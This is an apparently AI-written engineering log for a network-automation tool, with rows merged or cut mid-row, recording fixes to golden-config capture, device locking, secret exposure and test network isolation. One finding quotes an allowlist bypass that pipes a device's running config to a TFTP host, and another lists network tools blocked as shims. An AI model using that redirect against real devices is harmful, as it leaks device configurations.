| C89 | **Capture promotes whatever a device holds to the record of record, and asks nothing** (the operator, 2026-09-27, from the host). A hand change made in the terminal, then Save All, became within four minutes a golden, `baseline/20260927T154517Z` and a commit auto-pushed to GitHub (`last push 15:45:23Z … e63b2e6d`). "Golden" means approved, and the only approval was a button meaning "capture". It survives the terminal lockout, because any unguarded writer (console, RESTCONF, NETCONF, a person on the device) gets the same free promotion the moment anyone captures. **Worse than it looks: capture SILENCES the drift checker.** After it, the golden equals the device, so drift against the golden reads clean. **Measured 2026-09-27** (`/deploy/plan` over the fleet, which reads only and sends nothing): 8 of 9 devices' committed intent matches their capture, and r2's differs by exactly the break (1 added, 1 removed). The plan already offers the repair (`interface GigabitEthernet2` / ` ipv6 ospf 1 area 0` / `exit`). So the signal capture erases (device against golden) is not the one that survives it (capture against INTENT). **My read of the four options:** (a) YES: capture is an approval of content, so confirm what you are enshrining. The preview shows each device's diff against its current golden AND where it departs from committed intent; Save All is the fleet form of the same operation, confirmed per device by capture hash (C82's shape). (c) YES, defined against INTENT, never the golden, since at capture the golden becomes the capture and the comparison is empty by construction. A `baseline/` tag needs coverage AND every device's capture matching its committed intent. Measured, that denies exactly `20260927T154517Z` today and nothing else, so it does not refuse on its first day; E7's golden state then adds "working". (d) YES, but as a computed FACT rather than a claim about who looked: every golden commit, whatever the path (Save All, a deploy's stage 8.5, an approval, onboarding, a CLI), carries `Intent-Match: yes` or `Intent-Match: no: <device> (<n> lines)`, computed at commit time in one place. That is what makes the 3am case visible without anybody deciding to look. (b) NO as a refusal: a golden is the record of the device, and refusing to capture a device's real state makes the record lie. "Captured, but not a baseline, and marked" is (c) plus (d). **And in 7.2:** a device whose golden departs from committed intent is a Needs-attention row, because after a capture it is the only signal left. | 2026-09-27 | **DECIDED by the operator and scheduled into 7.1 step 4.** Stated exactly (the operator): the 3am case is not silent, it is SILENT IN DRIFT, the signal people actually watch. "The record was corrupted" and "one of two comparisons was corrupted" are different problems, and only the second has a cheap fix. Capture corrupts the comparison against the GOLDEN, which it becomes; the comparison against INTENT survives (8 of 9 match, r2 differs by exactly the two lines, and the plan offers the repair). Decided: (a) capture previews each device's diff against its golden and against committed intent and is confirmed per device, with Save All joining; (c) a baseline tag needs every capture to MATCH COMMITTED INTENT, not the golden, which would be empty by construction (the trap of validating a masked render against itself); (d) every golden commit carries a computed `Intent-Match:` trailer, whatever the path, auto-push included, which makes git answer which captures enshrined something nobody intended; (b) refused. **Weighted highest by the operator:** the 7.2 Needs-attention row for a device whose golden departs from its intent, since after a capture it is the only remaining signal and it needs nobody to look deliberately. |

The NetBox tab draws that summary's `failed` list and a green "last sync" badge when the list is empty. C8's fields (`write_failures`, `partial`, `complete`) were built so that a device whose VLAN, cable or primary IP did not land could not read as a clean import. They are in the stored summary, and nothing reads them. So the state C8 was fixed to prevent (a partial import reading as clean) is on screen now, one step later than the counter it fixed. | 2026-09-27 | **Fixed inside 7.1 step 2, as the operator decided.** The import's outcome is a RESULT (`preview_confirm.netbox_sync_result`), computed on read from the stored summary: `complete` decides the level, every write that did not land is named with its device, a summary older than C8's counting says what landed is UNKNOWN (never green), and the card's badge takes the level; the outcome opens with the component. **Why the checks missed it, measured:** the payload check's forward direction names a carried field nobody reads, and its `GET /netbox/status` fixture had no stored import (`status` empty, declared "NetBox is not configured in the fixture", C72's class). Given a stored partial import it named five fields at once, among them **a second C85: the import's own refusals (`notes`), collected so a refusal would be read, drawn nowhere**; now drawn as what the import declined to do. A positive control (a planted key) showed the first version of the entry examined nothing, because it was silently dropped as a duplicate dict key (C90). Controls: the card back on `failed`, the adapter ignoring `complete`, and the notes not drawn each fail their aimed tests. |
| C90 | A dict literal with a duplicate key silently kept the later value, and hid a new `RENDERS` entry behind an old one. | 2026-09-27 | **Fixed, as a rule.** Found by a positive control on the C85 fix: 22 tests passed about `GET /netbox/status` while the entry they examined was the older one, with a fixture that could not reach a stored import. The same shape in `route_gates.GATES` would silently drop a gate. `test_no_duplicate_dict_keys.py` scans every dict literal with constant keys in the program, its scripts and its tests (4,530, floor 4,000); none repeats a key, and a control shows the scanner finds the exact shape. |
| C91 | A Save All that COMMITTED took a baseline with a device skipped: `save_golden()` checked coverage only on its no-change path. | 2026-09-27 | **Fixed, found writing C89 (c).** CLAUDE.md said Save All's inventory size and skip list "travel with the save" so a baseline cannot be claimed for a fleet one of whose members was never measured, and the committing path never read them. | C98 | The confirm-by-hash guarantee assumed ONE mover: a restore and a deploy ran on r2 at once, both confirmed, and the deploy's check passed against a stored config the restore was mid-way through rewriting. | 2026-09-27 | **Fixed: one operation per device at a time, refused by name, never queued** (`modules/nsot/device_ops.py`). A second is refused with the holder named, e.g. *"r2 is being restored by <operator>, started 18:52:49 UTC (re-apply baseline/20260925T201032Z)"*; in a batch the busy device is refused alone and the rest proceed. **Across processes**: an exclusive `flock` on one file per device, holding the holder as JSON, which the kernel releases when its process dies, so a crash cannot lock a device for ever; re-entrant for the thread that holds it (phase two rotates inside its own hold). | C101 | Paths wrote to a device without holding it (Save Device Config's `write memory`, the bulk operations, `/run_command`, bulk reload), and the lock's population was a list. | 2026-09-27 | **Fixed at the one opener** (the operator's question: can the population come from something structural?). Progress is noted by the pipeline's stage loop, rotation's steps, phase two's steps and retirement's steps. **Found building it:** C97's budget imported the agent to find a golden, which created directories, so opening any session from a read-only CLI touched the store (caught by `nmas-capture-output`'s audit hook; fixed, pinned in a child process); and `dir ?` became `show file systems`. **Why the suite could not have found any writer:** it passed at 4,815 with the guard in place and no hold on any of them, since nothing in it sends a real write through `open_ssh` (C41). | C61 | The read-only command allowlist checked the first WORD only, so `show running-config | redirect tftp://<host>/x` passed, and so did `| redirect flash:`. | 2026-09-27 | **Fixed, first, as the operator decided.** `modules/readonly_commands.py` is the ONE allowlist, whole command: the verb (show, ping, traceroute, dir, more), and EVERY output modifier after a `|` (begin, count, exclude, include, section, and their unambiguous abbreviations; anything else is refused, the writing ones named). Measured on both platforms, only the first `|` is a modifier, and the rest of the line is the filter's regex. So a later segment is refused only when its first word could name a non-filter modifier, failing closed for a platform that chains pipes. A test asserts every command the pipeline reads with passes the allowlist. |

| C55 | Both SNMP communities were returned in plaintext by `GET /monitoring/config`; the read-write one was drawn nowhere. | 2026-09-27 | **Fixed.** Both communities are write-only on every route: GET and the POST response carry `snmp_community_ro_set`/`_rw_set` and never a value, and an empty field saves nothing (B11). The page draws set/not set, the trap snippet carries a `<RO community>` placeholder, and a poll with none typed uses the stored one on the server. The agent tool `get_monitoring_config` wrote both values in PROSE lines, which positional redaction does not mask (measured: config syntax masked, `SNMP community (RW):  <value>` not), so it now reports set/not set too. The store itself (`lists/*/collector_config.json`) was written with `open(path, "w")`: now atomic and created 0600, and declared in the checker and SECRETS.md, where it had never been. **The sweep half** (`test_no_get_returns_a_stored_secret.py`) plants a distinct value in every store a SURVEY finds, sweeps every GET with its arguments filled, anonymous and as a person, and matches its population to the checker's secret classes. Controls: reverting the fix is found; a checker secret class with no plant fails. Its first run found C56. **What C55 actually was, measured on the host afterwards:** `collector_config.json` did not exist, so no community had ever been stored, and the values the page served were the code's defaults (`public`, `private`). No fleet golden carries an RW community (onboarding removes vrnetlab's), so there was nothing to rotate. All eight RO lines equal the default `public` by digest, so what went to browsers and the provider was the fleet's real RO community, and a value anyone guesses first. **The sharper half is the design:** the page sent `'public'` on every save with an empty field, so the moment the value stopped arriving, a save would have REPLACED a real community with `public`. A GET returning the value a later save depended on is worse than one leaking a secret; write-only fixed both, and an empty field now saves nothing. |

Fixed ONCE at the boundary rather than at 24 sites: `routes/list_param.py` refuses a GET or HEAD naming a list that is neither registered nor on disk, 404, naming it, before any view resolves a path, and says it is not the same as an empty list (an empty answer for a typo is a claim about a list nobody has). `listref.exists()` answers without creating, and `config.list_data_path()` is the one derivation both resolvers use. Writes are left to their routes. `test_reads_create_no_list.py` sweeps every GET for the property (floors: 100 swept, 20 with arguments), with controls both ways: the hook removed brings back all 24, and a real list by name and by slug still reads. Three tests read an unregistered list that existed only as a patched path; they now patch `LISTS_DIR` too, as this file already said tests must. |

| C46 | "No test touches a live network" was enforced for nothing a test STARTS, and one test's child asked the live NMAS for its map on every host run. | 2026-09-26 | **Built, three layers, on every machine.** (1) The test process refuses any non-loopback connect (an audit hook measured NONE before it was added, with a positive control). (2) `scripts/nmas-test` runs the suite in a loopback-only network namespace, and CI requires it. (3) **Every process a test starts, BY CONSTRUCTION:** a wrapper on `subprocess.Popen` (measured to be the only spawn path under test) rewrites every child's environment, an explicit one included: Python children load a `sitecustomize` refusing non-loopback connects and DNS names, `ssh`/`scp`/`sftp`/`rsync`/`curl`/`wget`/`nc`/`ncat`/`telnet` resolve to refusing shims (deferring only to a fake the test built under pytest's own temporary tree), and git may use local paths only. Every attempt is recorded and FAILS the test that made it, by name, because a child's own error is often swallowed by the code under test, which is how the original request went unseen. C46's exact case is a test. Six controls, each failing its target. **The host namespace was DECLINED (the operator, 2026-09-26), so it is not re-proposed without new facts:** a sudoers helper is narrow, but it is a root-owned path invoked by the TEST HARNESS on the machine that holds `key.key` and reaches every device, and the harness is exactly what did something nobody expected here; lifting the AppArmor restriction host-wide is worse. "NOT CONFINED, and it says so" is the honest state on the host, layer 3 covers it by construction, and the namespace runs in CI where it is free. |

| C22 | rclone's exit code proved neither permission nor transfer, and the off-box push trusted it. | 2026-09-26 | **Fixed.** Measured by the operator: a refused read was retried ten times (`401`), then rclone printed `There was nothing to transfer` and exited 0, with the 401 visible only at `-vv`. The push path did not read, so it was unaffected on the day. But it confirmed its upload by exit code alone, and so would anything added later. Now every push is confirmed by LISTING `daily/` (a directory listing, which needs only `listFiles`; a single-file path would HEAD and need `readFiles`) and requiring the object at the artefact's exact size. An enabled prune is confirmed by listing too. The real `lsjson` shape was measured on the host before relying on it. Four controls. |
| B7 | `vmdata` became thin-provisioned and nothing watched its real allocation. | 2026-09-25 | **Built and live.** `job_health` reads `disks/zfs` (ALLOC/SIZE, what `zpool list` prints; readable by the auditor token, measured) and reports each pool: `pool_degrading` at 80 % (a convention, named as one), `pool_will_pause` when the headroom above ZFS's write reserve (1/32 of the pool, capped at 128 GiB) falls under 5 % of the pool, and `pool_unhealthy` for any health but ONLINE. An empty answer is `unknown`, never "no pools". Live: `vmdata 8.6% allocated (79.4 GiB of 928.0 GiB), frag 27%, ONLINE; 819.6 GiB before ZFS refuses writes`. Four negative controls, including substituting Proxmox's reservation percentage for ALLOC/SIZE. The thresholds come from OpenZFS and QEMU defaults, not from measuring a pool filling here. |

A copy of `data/` exists in B6's nightly image. The two were tied together by the restore test: the fingerprint of `key.key` inside the restored clone equals the escrowed `f42bddcea15442c2`, and the clone's app started on it. |

Both images were taken with the guest agent's fs-freeze. `job_health` watches it through a read-only token: per VM from the task logs, the storage (`inactive` / `will_not_fit` / `images_missing`) and the thin pool. The unmount check read `inactive`. **The test restore passed on the real image**: 9102 up with its links down, postgres recovered, HTTP 200, and the key fingerprint matched the escrow. | C21 | The heartbeat measurement AND the alert rules counted any line that merely named the applet. | 2026-09-25 | **Fixed.** Found because the check correctly reported s4 INSEPARABLE after the alert test. The long gap from the silence (2,925 s) WAS excluded. The cause was a SHORT one: 73 s, ending at `%HA_EM-4-FMPD_NO_EVENT: No event configured for applet NMAS-HEARTBEAT`, which the substring query `|= "NMAS-HEARTBEAT"` counted as a heartbeat. The alert rules use the same query, so a broken applet's own error read as a sign of life: the unsafe direction. Now anchored on the line's exact form, `%HA_EM-\d-LOG: NMAS-HEARTBEAT: NMAS-HEARTBEAT`. Over 6 h of the whole fleet those were the only two shapes naming the applet. **Also:** every gap spanning the device's own `%SYS-5-CONFIG_I` is excluded, because re-entering the applet restarts its timer and leaves a gap between one and two intervals: under the long-gap cut, and enough to make any maintenance window leave INSEPARABLE behind it. Re-measured live: all nine devices `measured`, s4 at window 1005 s. **The generated rules file was an untracked file in the live checkout** (the script's default output path), so committing it would have aborted the next pull. It is now gitignored, and `--check`'s help no longer calls it "committed". **Operator step:** regenerate and reinstall the rules; the installed ones still carry the substring query. |
| C20 | A settings-route test failed intermittently, echoing `kea_username` as `''`. | 2026-09-25 | **Two causes, both measured and fixed, neither the one first suspected.** **(1) The test failure: import-time binding.** `modules.integrations.base` binds `get_setting` by name. When `test_onboard_plan.py` ran before anything imported `app`, `base` was first imported inside that file's `lab` fixture, while `settings_schema.get_setting` was a lambda answering unlisted keys with the schema default. `base` kept the lambda. An import hook recorded the import, on the main thread, with the lambda bound. The order was deterministic: 3 of 3 failed with that file first, 2 of 2 passed with it second. The **streaks were my subset command**: `grep` in the tool shell is a parallel `ugrep` and returns files in varying order. `conftest.py` now imports `app` before any test runs, as the program does, and a subprocess test runs the failing order. **(2) Found while chasing it, and worse: concurrent settings writes CORRUPTED the file.** A probe recorded every write during a failing run and saw only the route's own two, both correct, so the redaction refresh and the background threads were ruled out by measurement. But `save_user_settings` used one temp name for every writer, and no read-modify-write held a lock. Two threads × 150 writes left `user_settings.json` unreadable in 2 of 2 runs, and the unreadable-file guard then refused every write. Fixed: a per-write `mkstemp`, and `config.settings_lock()` (an RLock, plus `flock` across processes) around all four read-modify-write sites. After the fix: 300 of 300 keys, threads and processes, 3 of 3 runs. An AST scan requires the lock in any function that both loads and saves. The general-settings POST was one of the four, and it **bypasses `write_settings()`**, so CLAUDE.md's *one write path* was not true. |

NetBox also answered the heartbeat generator's queries after the change. The backup writes its copies `0600` regardless (pinned). |
| C18 | Commits from a CLI never pushed. | 2026-09-25 | **Fixed.** Post-commit hooks run on daemon threads, and a short-lived process (`nmas-retire`) exited under its own push: r5's retire commit `3592113` never reached `<repo>`, and nothing recorded a failure. Hook runners are now joined at exit, bounded at 90 s; an unfinished one is named on stderr as "the commit is local and may not have been pushed". Proven in a real subprocess, with a control. `3592113` pushes with the next commit from the app, or by hand. |
| C19 | Secret stores the checker could not see, and their modes. | 2026-09-25 | **Fixed in code.** `nmas-check-secret-storage` classifies EVERY file under `data/` (secret: must be 0600 / no-secret: scanned / config-bearing / plain), and an undeclared file fails the run, so a new store is noticed on its first run. Outside `data/` it checks a declared list (rclone.conf, the NetBox env files, the backup push key). Live: 773 files classified, 0 unclassified, and **5 loose secret stores found**: `credential_profiles.json`, `devices.csv` plus two old copies, and `secret.key` (Flask's session key), all 0664, beneath a run that had printed "every file holding a secret is owner-only". The credential store's and devices.csv's writers and `secret.key`'s creation now go through `open_secure`, so the next write heals them. The two old CSV copies and `secret.key` are never rewritten, so they need `chmod 600` by hand. Actual exposure was limited: `data/` is 0700. |
| C16 | The per-platform heartbeat window was the wrong shape. | 2026-09-25 | **Built: per-device windows** (`scripts/nmas-heartbeat-rules`). Each device's window is the midpoint of its own separable band, measured from its Loki arrivals, with misses in the history excluded. A new device gets a **provisional** window, labelled as such in the rule itself and derived from the fleet's slowest measured rate; a device with an empty band is named `inseparable`. `--check` re-measures hourly on its own timer, declared in `job_health`, and names `STALE RATE`, `PROVISIONAL READY`, `UNMEASURABLE`, `MISSING` and `EXTRA`. **Live: nine measured windows**, r1–r4 and r6 750 s, s1 797, s2 799, s3 1286, s4 996; r5 named not expected; `--check` current for all nine. Controls shown failing. |
| C15 | A write whose commit failed was stranded, and the run that stranded it reported success. | 2026-09-25 | **Fixed in `scripts/oxidized-to-config.sh`.** Every run reconciles every managed file BEFORE the early exit and before any copy. A dirty file is committed ("recorded late") only when it is byte-identical to `render_device`'s output for the Oxidized version its own header names; anything else is REFUSED for that device, neither committed nor overwritten, named, and the run exits 3 (including on the "nothing to copy" path). The per-lab commit now adds and commits only the job's own files by path. The executed tests found their own fixture could not exhibit the version case (its second poll changed only a stripped comment); fixed, and the control then fired. r6's stranded file was committed by hand by the operator. |
| C11 | Deleting a device left it half-managed in five places; there was no retire. | 2026-09-25 | **Built: `scripts/nmas-retire` / `modules/nsot/retire.py`.** Clear the override, declare the startup file deliberately unmapped, then one commit that removes intent and golden and releases the identity (history kept), then the CSV row LAST, and only against a break-glass record holding the device's CURRENT credential (a refusal, not a step). It states every time what it will NOT do: NetBox kept, Oxidized polling, startup frozen, device config unchanged, backups kept, the pooled session. It is resumable, and a failed commit puts the tree back. **ACCEPTANCE PASSED 2026-09-25 on the real device (operator):** commit `3592113`; zero r5 in host_vars, golden, devices.csv and the manifest; the approval withdrawn naming its cause ("device 'r5' is no longer bound"); `cisco_iosxe/base.j2` binds r1, r2, r3, r4, r6; credential overrides: 1 (r6's), 0 unclaimed. Declared-unmapped on its first real use: `produced : 9`, `declared : 1 — r5: ISP device outside our administrative boundary… (<user>, 2026-09-25T20:33:27Z)`. Found beside it and fixed: `nmas-clab-targets --device` unpacked 3 columns from 6-column rows and crashed on the first. |
| D3 | The template editor's confirmations did not say what happened. | 2026-09-25 | **Fixed.** The save message is built from the route's `approval_revoked` and `revoked`; the approval cell draws the reason and then what re-approval needs; `_common.j2` is listed as a shared file (Edit only, with what editing it revokes). | C3 | *"The recorder missed a confirmed write."* | 2026-09-25 | **Measured false.** The record holds the entry (`r1 comments … TEST → …`, `06:34:40Z`), the file's mtime is 0.18 s after NetBox's `last_updated`, the reader lists it, and the app log holds 0 recorder ERROR lines in 549,266.
